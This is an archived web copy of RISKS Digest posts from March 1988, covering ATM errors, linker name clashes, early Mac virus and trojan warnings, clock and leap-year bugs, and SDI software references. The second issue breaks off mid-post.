<A HREF="#subj5.1">
David Collier-Brown
</A><br>
<A HREF="#subj5.2">
 Henry Spencer
</A><br>
<A HREF="#subj5.3">
 Andrew Klossner
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Another Mac virus on the loose? 
</A>
<DD>
<A HREF="#subj6.1">
Chris Borton via Dave Platt
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  The last word (words, words and more words) on viruses 
</A>
<DD>
<A HREF="#subj7.1">
Robert Slade
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj8">
  BEWARE of PC-LOCK 
</A>
<DD>
<A HREF="#subj8.1">
James Ford
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj9">
  Moving time backwards 
</A>
<DD>
<A HREF="#subj9.1">
Paul Smee
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj10">
  Leap Year 
</A>
<DD>
<A HREF="#subj10.1">
Harold E. Russell
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj11">
  SDI related sources 
</A>
<DD>
<A HREF="#subj11.1">
Dan Jones
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj12">
  Electronic Privacy Act Info Request 
</A>
<DD>
<A HREF="#subj12.1">
Eliot Lear
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
computer error and learned helplessness
</A>
</H3>
<address>
&lt;<A HREF="mailto:suneast!norbert!bruces@Sun.COM ">
suneast!norbert!bruces@Sun.COM 
</A>&gt;
</address>
<i>
Tue, 8 Mar 88 14:11:02 EST
</i><PRE>

In RISKS 6.38, Eric Herrmann relates his experience with a spurious electronic 
debit. Fortunately, the bank discovered its error and Eric eventually got his 
$60 back without having to raise a fuss.  However, I believe that in general 
such erroneous debits ought to be contested.  Unless I am mistaken, the burden 
of proof then falls on the banks to prove the cardholder has in fact withdrawn 
the money.
  
The ATMs I'm familiar with here in Massachusetts are monitored by hidden 
cameras, and I imagine the same is true of ATMs in other states.  The banks 
have recourse to the photographs taken by these cameras when a transaction is 
contested.

Though I've not had the pleasure of contesting a debit to my account, I believe
my bank requires a nominal (~$5) service charge to investigate a transaction. 
The fee is a hedge against slews of fraudulent appeals and is refunded if your 
claim is borne out.

Eric's decision to "eat the $60 loss" seems to me an example of a pervasive 
computer RISK:  the learned helplessness that afflicts many people when 
confronted with computer-related bureaucratic injustices.  

I do not intend this message as a put-down of Eric.  I believe many people 
would have made the same choice he made.  But who among us would have 
complacently accepted being short-changed $60 by a human teller or a store 
cashier?

Eric's statement: "but...I couldn't prove anything," reflects a common
attitude that, where computers are concerned, "you can't win, so why even
bother trying?"  Isn't this attitude the flip side of overreliance and
unquestioning trust?  In both cases there is the unwillingness to challenge
the myth of the computer's monolithic infallibility.  Debunking this myth, it
seems to me, ought to be a goal of every concerned computer professional.

Bruce A. Sesnovich, Sun Microsystems, East Coast Division, Billerica MA

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
Garbage In, Gospel Out
</A>
</H3>
<address>
&lt;<A HREF="mailto:ephraim@Think.COM">
ephraim@Think.COM
</A>&gt;
</address>
<i>
Tue, 08 Mar 88 09:16:24 EST
</i><PRE>

In Risks volume 6, issue 38, Paul Smee (Smee@AUCC.AC.UK) writes:

  "I recently objected to a sales assistant trying to charge me an
   amount I knew was wrong.  'The till [US cash register] says it's 12
   pounds', she insisted.  'Why don't you believe it?'"

I was interested to find recently that ill-founded faith in the output
of calculating machinery has been with us as long as possible.
Consider the following (whose attribution should be obvious):

	On two occasions I have been asked [by members of
	Parliament!], "Pray, Mr. Babbage, if you put into
	the machine wrong figures, will the right answers
	come out?"

	I am not able rightly to apprehend the kind of con-
	fusion of ideas that could provoke such a question.

Sad to say, the modern public is no more wary of GIGO than were 19th
century MPs.

Ephraim Vishniac					  ephraim@think.com
Thinking Machines Corporation / 245 First Street / Cambridge, MA 02142-1214

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
Re: Checking Statements &amp; Disappearing Skills
</A>
</H3>
<address>
Darin McGrew
&lt;<A HREF="mailto:ibmuupa!mcgrew@ucbvax.Berkeley.EDU ">
ibmuupa!mcgrew@ucbvax.Berkeley.EDU 
</A>&gt;
</address>
<i>
Mon, 7 Mar 88 14:00:50 PST
</i><PRE>
Organization: IBM ACIS, PALO ALTO

In RISKS 6.36 David Andrew Segal (dasegal@brokaw.LCS.MIT.EDU) relates an
incident involving an ATM deposit that wasn't registered by the bank's
computer.

I am often amazed at the number of people who trust banks, stores,
restaurants, etc, to never make mistakes.  Apparently it is too much bother
(or simply too difficult) to ever reconcile statements or verify receipts.
Add to this the ability of computers to replicate human errors a thousand
times a second, and we have a real RISK, for which there can be no technical
solutions.  This is a real               [Sorry.  The last word got lost!  PGN]

Darin                                I speak for myself, not for my employer.

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
Disappearing skills
</A>
</H3>
<address>
&lt;<A HREF="mailto:forags@violet.Berkeley.EDU">
forags@violet.Berkeley.EDU
</A>&gt;
</address>
<i>
Tue, 8 Mar 88 09:11:23 PST
</i><PRE>

Several years ago, I was using a calculator to add a series of numbers.  The
result "felt" wrong, so I did it by hand and found that the calculator had
malfunctioned -- for every digit on the display, 8's looked like 6's because
one of the LED segments failed to light up.  If I had been doing something
more complicated than addition, I probably would never have spotted the
problem.

Maybe calculators should have some sort of "self-test" program built in which
would be automatically  invoked when the unit is powered up?

Al Stangenberger                    Dept. of Forestry &amp; Resource Mgt.
forags@violet.berkeley.edu          145 Mulford Hall - Univ. of Calif.
uucp:  ucbvax!ucbviolet!forags      Berkeley, CA  94720
BITNET: FORAGS AT UCBVIOLE          (415) 642-4424                      

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
Re: Lousy Lazy UNIX Linkers (Joe Dellinger)          [<A HREF="/Risks/6.34.html">RISKS-6.34</A>]
</A>
</H3>
<address>
David Collier-Brown
&lt;<A HREF="mailto:geac!daveb@uunet.UU.NET ">
geac!daveb@uunet.UU.NET 
</A>&gt;
</address>
<i>
7 Mar 88 13:59:34 GMT
</i><PRE>

In <A HREF="/Risks/6.34.html">RISKS-6.34</A> Joe Dellinger comments:
[discussion about linking and having variables change mysteriously]
&gt; ...           And if you don't happen to have the source code for one
&gt;of the libraries that gets linked in, such as the FORTRAN runtime library,
&gt;THERE REALLY IS NO WAY YOU CAN KNOW AHEAD OF TIME what variable names might
&gt;get overlayed in this way...

  Well, it's a known, long standing problem.  In the natural environment of
Unix V6 (cooperative software development, all sources available) it was a
reasonable implementer's choice.  In some other environments, not so.
  The ANSI committee is aware of it, and has made a well-known work-around
(reserved leading underscore) part of their proposal.  If the
only-available-in-binary library is part of the C language run-time system,
it is blatantly illegal.
  This doesn't help much if it is a bought-in product: the general solution
to this requires a fair bit more work, equivalent to specifying an
Ada[tm]-quality linker as part of the language definition.  I claim that
_that_ is easy.  Others disagree.
  It remains a risk.

David Collier-Brown, Geac Computers International Inc., 350 Steelcase
Road,Markham, Ontario, CANADA, L3R 1B3 (416) 475-0525 x3279
                 {mnetor yunexus utgpu}!geac!daveb 

</PRE>
<HR><H3><A NAME="subj5.2">
Re: Lousy Lazy UNIX Linkers
</A>
</H3>
<address>
&lt;<A HREF="mailto:mnetor!utzoo!henry@uunet.UU.NET">
mnetor!utzoo!henry@uunet.UU.NET
</A>&gt;
</address>
<i>
Mon, 7 Mar 88 13:50:53 EST
</i><PRE>

&gt; ... if you don't happen to have the source code...
&gt; THERE REALLY IS NO WAY YOU CAN KNOW AHEAD OF TIME what variable names might
&gt; get overlayed in this way...

Actually it's not QUITE that bad.  You can find out, but the procedure is
obscure and painful and nobody does it.  (See the "nm" command, which can
be convinced to give you a list of all the global names in a library.)

The real problem here is not Unix-specific:  name-space pollution.  Smart
library writers are careful to use systematic naming conventions that a
user is unlikely to duplicate.  The ANSI X3J11 C-standardization effort is
in fact trying to require this for the standard libraries.

Even less-permissive linkers can cause trouble when the internal name
spaces of libraries overlap.

Henry Spencer @ U of Toronto Zoology {allegra,ihnp4,decvax,pyramid}!utzoo!henry

</PRE>
<HR><H3><A NAME="subj5.3">
Lousy Lazy UNIX Linkers aren't at fault
</A>
</H3>
<address>
Andrew Klossner 
&lt;<A HREF="mailto:andrew%frip.gwd.tek.com@RELAY.CS.NET">
andrew%frip.gwd.tek.com@RELAY.CS.NET
</A>&gt;
</address>
<i>
Tue,  8 Mar 88 12:46:45 PST
</i><PRE>
Organization: Tektronix, Wilsonville, Oregon

The described problem is not the fault of the linker, but of the design
of the Fortran language.  If two programs each contain the line

	COMMON /PC/PC

and they are compiled separately, then there is no mechanism by which
the compiler can declare that one program defines PC and the other
program uses PC.  Subsequently, the loader must accept one or many
COMMON declarations to mean that a single object should be established
and all the declarations connected to it.

The risk, then, is in writing software in a thirty-year-old language
whose design preceded much of our understanding of software risks.

The C language definition rode on this convention to some extent; the
declaration "int pc;" outside a function is equivalent to "extern int
pc;".  To declare a variable in a way that ensures ownership, initialize
the variable, e.g., "int pc=0;".  (Of course, this will still silently
match the Fortran COMMON statement above.)

  -=- Andrew Klossner   (decvax!tektronix!tekecs!andrew)       [UUCP]
                        (andrew%tekecs.tek.com@relay.cs.net)   [ARPA]

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
Another Mac virus on the loose?
</A>
</H3>
<address>
Dave Platt
&lt;<A HREF="mailto:dplatt@coherent.com ">
dplatt@coherent.com 
</A>&gt;
</address>
<i>
Mon, 7 Mar 88 21:09:37 PST
</i><PRE>

The following posting appeared in comp.sys.mac this evening.  If you have
any information about the virus reported in this posting, please speak up!

From: borton@net1.ucsd.edu (Chris Borton)
Subject: I've got a virus and I don't like it
Date: 8 Mar 88 02:04:12 GMT
Organization: UCSD Network Operations Group

This is a warning and plea for more information, if anyone has any. We just
discovered a virus in some of our systems (not all) at work today, and it has
permeated my system at home as well.  The symptoms are simple:

INIT 32 in System File

nVIR resources in various applications and the System File.

This sucker is tricky -- it is getting itself loaded before any INITs do (we
believe the INIT 32 is just a teaser), like PTCHs do, but it isn't in PTCH.
Our two best programmers spent today tracing through it and still haven't found
a real solution other than offloading and re-initializing.

To our knowledge it is non-malicious (yet).  The nVIR resources are usually
small, sometimes 8 bytes, sometimes ~360.  If you remove them from both 
System and ResEdit, the virus won't let you run ResEdit because it is looking
for those resources and can't find them.  It occasionally beeps when running a
program.

We have no idea what installed this.  We are fairly certain it originated from
one of the many small programs that come over the net.  Many of these would be
perfect 'carriers' -- little demo program that's an "aww, that cute, now let's 
trash it."  I'm not putting down these programs, just pointing out what I feel
is obvious.

I don't believe this is any cause for panic -- it hasn't done any known harm
yet.  I would, however, like to get to the bottom of this!  If it's a joke, I
don't find it very funny.  (unless it de-installs itself completely after April
Fool's Day :-)). If it is someone's graduate thesis, you get an A-.  But enough
is enough!

Chris "Johann" Borton, UC San Diego
...!sdcsvax!borton    borton@ucsd.edu     BORTON@UCSD.BITNET

------------------------------ 

Date: Tue, 8 Mar 88 07:42:24 PST
From: Robert_Slade@mtsg.ubc.ca
Subject: The last word (words, words and more words) on viruses

     For anyone interested, I have compiled all the virus messages I could
find on virus, trojan horse and related topics from RISKS, Computers and
Society, INFO-IBMPC and INFO-MAC.  The uneditted file runs to 70 pages.
(Anyone wanna publish a book?)  For those in Canada, The Globe and Mail for
Monday, March 7, 1988, page C15, under the title "Devilishly clever viruses
may be lurking to devour your data" is telling everyone that you can recover
from a Trojan attack through a warm boot.
 
(And how many nanoseconds is your reaction time?)

    [And James Ford &lt;JFORD1%UA1VM.BITNET@CUNYVM.CUNY.EDU&gt; has the
    DIRTY DOZEN listing from Eric Newhouse on hacked/trojan/virus programs...
    Much too much for posting.  But there are no LAST words on this one.  PGN]

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
     BEWARE (J. Greely)
</A>
</H3>
<address>
        James Ford 
&lt;<A HREF="mailto:JFORD1%UA1VM.BITNET@CUNYVM.CUNY.EDU">
JFORD1%UA1VM.BITNET@CUNYVM.CUNY.EDU
</A>&gt;
</address>
<i>
Tue, 08 Mar 88 09:00:57 CST
</i><PRE>

&gt;A quick warning about PC-LOCK (shareware).  If.........version 1.0.....

I didn't know that one could consider PC-LOCK shareware....  :-)

Just as a note......the version of PC-LOCK that we're using here is
Version 3.0 on IBM PC/XTs.  Also, the included text (reprinted without
permission) states the latest enhancements available on Version 3.0....

    (quote)
          Thank you  for buying  PC-Lock version  3.0.  We believe you will
          find it  to be  an effective  and convenient  security system for
          your IBM-PC/XT/AT or compatible.  Version 1.1 was reviewed in the
          June 23, 1987 issue of PC-Magazine and listed among "The  Best of
          the Best  Utilities."  Version 3.0 provides enhanced security and
          several new features including:

               Simplified multi-system installation,
               An administrator password,
               Multiple user passwords,
               Support for large hard disks,
               Support for multiple hard disks,
               Works with the EGA controller/display,
               Ability to prevent user's from breaking out of AUTOEXEC,
               and others described below.
      (unquote)

</PRE>
<A NAME="subj8"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj8.1">
    Moving time backwards
</A>
</H3>
<address>
Paul Smee 
&lt;<A HREF="mailto:Smee@AUCC.AC.UK">
Smee@AUCC.AC.UK
</A>&gt;
</address>
<i>
Tue, 8 Mar 88 10:47 GMT
</i><PRE>

The recent talk about setting time backwards reminds me of something that
happened on the MIT Multics about 10 years ago.  The Multics system clock
counts time as number of microseconds since midnight, Jan 1, 1901 (well, maybe
1900, not sure).  The microsecond clock value at the time when a file is
created is used as unique identifier for the file; there is suitable gating to
ensure that on a multi-processor machine, two processors don't get an identical
clock value.  In order to ensure that file unique IDs really are unique within
a system, the Bootstrap system would not allow the ops to bring the Multics O/S
up if the clock (set manually within BOS) was before the recorded time of the
last shutdown.  (Why HIS didn't put in a permanent battery backed up clock was
always a source of wonder, but is another question.)

One day, after a shutdown, the Ops mistakenly (finger trouble) input a date
which was something like 2 days in advance of the real date -- e.g.  14 March
rather than 12 March -- and started the Multics service.  On realizing their
error, they shut down Multics (back to BOS) to change the date to the correct
one.  The system would then not let them restart Multics.  In that case (and
after a couple of hours of poking thru microfiche) the system programmers
decided it would be quicker just to leave the machine down for two days, than
it would be to try to hack the system code to let them boot, and to ensure that
there were no bad side-effects.  (And, they thanked the gods that the Op had
only missed by a couple of days, rather than getting the month, or worse, the
year, wrong.)  Ultimately, a 'fix' arrived, which consisted merely of having
BOS query the Ops for confirmation if they tried to bring up Multics with a
date-time more than a set interval after the previous shutdown.

   [I tried to GREP this one out of the RISKS archive, but did not find it.
   However, it is my vague recollection that this tale might have been related
   here somewhen in the distant past.  Excuse me if you saw it before.  PGN]

</PRE>
<A NAME="subj9"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj9.1">
Leap Year
</A>
</H3>
<address>
Harold E. Russell 
&lt;<A HREF="mailto:russell@mitre.arpa">
russell@mitre.arpa
</A>&gt;
</address>
<i>
Tue, 08 Mar 88 09:42:36 EST
</i><PRE>
Organization: The MITRE Corp., Washington, D.C.

We seem to have had a flurry of problems with Feb 29.  Please don't 
forget to watchout for Day 366 on Dec 31.

</PRE>
<A NAME="subj10"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj10.1">
SDI related sources
</A>
</H3>
<address>
&lt;<A HREF="mailto:DMJ%Vms.Cis.Pittsburgh.Edu@VB.CC.CMU.EDU">
DMJ%Vms.Cis.Pittsburgh.Edu@VB.CC.CMU.EDU
</A>&gt;
</address>
<i>
Thu, 3 Mar 88 19:36 EDT
</i><PRE>

Here is the list of sources relating computers and SDI that I compiled.
Thanks to the people who sent me sources.  
								Dan Jones

Adam, John A. and Paul Wallich, "Part 1- Mind-boggling
complexity" IEEE Spectrum, September, 1985.

Bellin, David and Gary Chapman, Eds. "Computers in Battle".
Harcourt Brace Jovanovich 1987. in particular: "Computers in the
Strategic Defense Initiative" by Steve Berlin and Eric Roberts.
"The Strategic Computing Program" by Jon Jacky, (which includes
discussion of SCP's relationship to SDI).

Benson, David B., "The Second Labor of Hercules: An essay on
software engineering and the Strategic Defense Initiative".
Washington State University Computer Science Department, 1986.

Boffey, Philip: "Software seen as obstacle in developing 'Star
Wars'.", The New York Times, Sept. 16, 1985.

Buchsbaum, S.: "SDI software: the telephone analogy. Path I: the
software will be reliable.", Physics &amp; Society, 16:2, April,
1987, p. 6.

Dahlke, K.: "SDI software, Part II: the software will not be
reliable.", Physics &amp; Society, 16:2, April, 1987, p. 8.

Eastport Study Group: "A report to the director, Strategic
Defense Initiative Office.", December, 1985.

Eastport Study Group, "Summer Study 1985", Department of Defense
(SDIO).

Fletcher J.C. et al, "Report of the Study on Eliminating the
Threat Posed by Strategic Nuclear Missiles, Vol 5: Battle
Management, Communications and Data Processing" (Unclassified)
Department of Defense. Govet Printing Office, 1984.

Jacky, Jonathan: "The 'Star Wars' defense won't compute.", The
Atlantic, June, 1985.

Lin, Herbert, "Software and Star Wars: An Achilles Heel?"
Technology Review.

Lin, Herbert, _Arms and Artificial Intelligence: Applications of
Advanced Computing_, "Software and Systems in Strategic Defense",
book editor is Allan Din, publisher Oxford, January 1988.

Lin, Herbert: "Software for ballistic missile defense.", MIT
Center for International Studies, Report C/85-2, 1985.

Lin, Herbert, "The development of software for ballistic-missile
defense.", Scientific American, December, 1985, p. 46.

Myers, Ware, "Can Software for the Strategic Defense Initiative
ever be error free?" IEEE Computer, November 1986.

Myers, W., "The Star Wars Software Debate" Bulletin of the Atomic
Scientists, February 1986.

Nelson, Greg, and David Redell, "The Star Wars Computer System"
25 June 1985. (Available from CPSR)

Nelson, Greg and David Redell, "The Star Wars Computer System"
Abacus, Winter 1986.

Nelson, Greg and David Redell, "Could We Trust the SDI Software?"
Chapter 5 of "Empty Promise" by the Union of Concerned
Scientists, Beacon Press, 1986. ISBN 0-8070-0413-8.

Office of Technology Assessment, "Strategic Defenses" Princeton
University, Press 1986. ISBN 0-691-02252-6.

Ornstein, Severo M. "Loose Coupling : Does it Make the SDI
Software Trustworthy?"  October 1986. (Available from CPSR)

Parnas, David L., "Why Communication Systems are Not Like SDI" 8
December 1985. (Available from CPSR)

Parnas, David L., "Software and SDI"  3 December 1985. 
(Available from CPSR)

Parnas, David L., "Software Aspects of Strategic Defense"
American Scientist, Sept/Oct 1985. (Also published in CACM,
December 1985., and a Univ. of Victoria, Dept. of Computer
Science Report DCS-47-IR, July 1985).

Zracker, Charles A., "Strategic Defense: A Systems Perspective"
Daedalus, Spring 1985.

Zracket, Charles A., "Uncertainties in Building a Strategic
Defense", Science, 27 March 1987.

</PRE>
<A NAME="subj11"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj11.1">
Electronic Privacy Act Info Request
</A>
</H3>
<address>
eliot lear
&lt;<A HREF="mailto:lear@aramis.rutgers.edu ">
lear@aramis.rutgers.edu 
</A>&gt;
</address>
<i>
Tue, 8 Mar 88 20:33:29 EST
</i><PRE>

I am researching the history and progress of the Electronic Privacy Act.
If you have an educated opinion on the law and wish to express it, please
contact me via E-Mail.         Thanks in advance,            Eliot Lear

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/6.38.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.6.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/6.40.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B30-76</DOCNO>
<DOCOLDNO>IA012-000130-B025-122</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/6.41.html 128.240.150.127 19970217020020 text/html 24936
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 01:58:34 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 6: Issue 41</TITLE>
<LINK REL="Prev" HREF="/Risks/6.40.html">
<LINK REL="Up" HREF="/Risks/index.6.html">
<LINK REL="Next" HREF="/Risks/6.42.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/6.40.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.6.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/6.42.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 6: Issue 41</H1>
<H2>  Thursday 10 March 1988  </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
Harmless Virus? 
</A>
<DD>
<A HREF="#subj1.1">
Richard S. D'Ippolito
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Have I Missed Something? (Hacking, Trojan horsing, etc.)  
</A>
<DD>
<A HREF="#subj2.1">
Chris McDonald
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Leap Year Madness 
</A>
<DD>
<A HREF="#subj3.1">
John W. Taylor Jr.
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  "NOPLATE" and "NONE" 
</A>
<DD>
<A HREF="#subj4.1">
Steve Philipson
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  ATM-OS-FEARic pollution 
</A>
<DD>
<A HREF="#subj5.1">
Jim Sims
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Another ATM discrepancy story 
</A>
<DD>
<A HREF="#subj6.1">
Ken Yap
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  Re: computer error and learned helplessness 
</A>
<DD>
<A HREF="#subj7.1">
James H. Coombs
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj8">
  Why don't they learn? (American vs European Date formats) 
</A>
<DD>
<A HREF="#subj8.1">
Gary Friedman
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj9">
  Computers on Aircraft 
</A>
<DD>
<A HREF="#subj9.1">
Keith Bjorndahl
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj10">
  Re: Reliance on computers (Inland Steel furnace burnout) 
</A>
<DD>
<A HREF="#subj10.1">
Dan Franklin
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj11">
  Lousy Lazy UNIX Linkers 
</A>
<DD>
<A HREF="#subj11.1">
Michael I. Bushnell
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj12">
  Need References to "Environmental Bugs" 
</A>
<DD>
<A HREF="#subj12.1">
Gene Spafford
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
Harmless Virus?
</A>
</H3>
<address>
&lt;<A HREF="mailto:Richard.S.D'Ippolito@sei.cmu.edu">
Richard.S.D'Ippolito@sei.cmu.edu
</A>&gt;
</address>
<i>
Wednesday, 9 March 1988 09:31:17 EST
</i><PRE>

In RISKS 6.39, Chris Borton makes the following statements regarding a virus
on his systems:

	To our knowledge it is non-malicious (yet).
	I don't believe this is any cause for panic -- it hasn't
	done any known harm yet.

Then he finally admits:

	If it's a joke, I don't find it very funny.

C'mon, everyone -- when your "two best programmers spent today tracing...and
haven't found a real solution...", then it HAS done harm. Figure that the
average technical employee requires a company to generate around $80K a year
in sales, so you've spent the equvalent of $640 already. And what about
others who will put the same time in helping Chris or themselves?  It's time
to come down hard on these @#&amp;^#*s and stop treating them like cute
pranksters. An "A-", indeed!
                                        Rich D'Ippolito

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
Have I Missed Something? (Hacking, Trojan horsing, etc.)
</A>
</H3>
<address>
Chris McDonald  STEWS-SD 678-2814 
&lt;<A HREF="mailto:cmcdonal@wsmr10.ARPA">
cmcdonal@wsmr10.ARPA
</A>&gt;
</address>
<i>
Tue, 8 Mar 88 14:26:55 MST
</i><PRE>
Cc: leonard@wsmr08.arpa

The forum recently had a posting of 14 "Dirty" files identified by Eric
Newhouse which had appeared in the 22 Feb 88 edition of InformationWeek.  When
I attempted to verify the accuracy of the data, I found an original article
attributed to Mr. Newhouse and contained in a local computer publication dated
August 1986 which contained the same programs.  

I discovered in reading the article, however, that the 14 programs were not all
Trojan Horse programs, but that some were what Mr. Newhouse labels "hacked"
of an otherwise legitimate freeware or user-supported program.  Since I had
seen no other discussion in the forum, and since apparently the list of
programs must be at least 18 months old, I wonder if I am correct in assuming
that indeed the list published in InformationWeek and the forum includes both
"hacked" and "trojan horse" files?  I note also that in the local publication
Mr. Newhouse identified two other file names for the Trojan Horse identified as
"DISKSCAN.EXE":  SCANBAD.EXE and RADDISK.EXE.  His description of the program
is that this was "a PC-Magazine program to scan a hard disk for bad sectors, 
but then a joker edited it to WRITE bad sectors."

While the passage of time may have allowed someone to take a "hacked" program
and make it a "trojan horse" as well, I would just like to verify the most
current information.

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
 Leap Year Madness
</A>
</H3>
<address>
"John W. Taylor Jr." 
&lt;<A HREF="mailto:JWTaylor@DOCKMASTER.ARPA">
JWTaylor@DOCKMASTER.ARPA
</A>&gt;
</address>
<i>
Thu, 10 Mar 88 11:47 EST
</i><PRE>

How long can we drag this one out, claiming that this only happens once every
four years, when in fact we must deal with a similar situation twice a year.

I am reminded of the time I gave my fiancee' (now wife) a call from college
late one Saturday night in October.  As was customary for us, being 300 miles
apart, we spoke for over an hour (61 minutes to be exact).  The phone company
computer, in its infinite wisdom, backed up precisely one hour during our
phone conversation to account for the change between Standard and Daylight
Savings time.  Rather than counting the number of minutes we talked, the
computer stamped a start and stop time for my call, thus the conversation went
from 12:00m to 12:01p.

Some points to ponder:  If we can't get an hour right, how can we expect to
deal with days/years?  How much money does the phone company lose when this
happens?  (Or does it gain when we "spring forward"?)  What would have happened
if my wife and I had spoken for 59 minutes and the computer would have had to
deal with a call from 12:00m to 11:59p the previous day?
                                                              --John

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
"NOPLATE" and "NONE" (Re:  <A HREF="/Risks/6.40.html">RISKS-6.40</A>)
</A>
</H3>
<address>
Steve Philipson 
&lt;<A HREF="mailto:steve@ames-aurora.arpa">
steve@ames-aurora.arpa
</A>&gt;
</address>
<i>
Thu, 10 Mar 88 10:04:37 PST
</i><PRE>

The old "warhorse" about the license plate "NOPLATE" probably repeats itself in
the real world on a regular basis.  I read about such a story within the last
year or two.  If memory serves correctly, this one occurred in New York.  The
plate was "NONE"; the newspaper article contained a photo of the car and the
plate.

The real issue here is of a system design failure.  The designers did not
include a way to indicate that there was missing information (plate absent), so
the users used some descriptive text that turned out to be a valid entry.  (Of
course, a missing data code might have been designed in but not given to /
forgotten by the officers in the field).

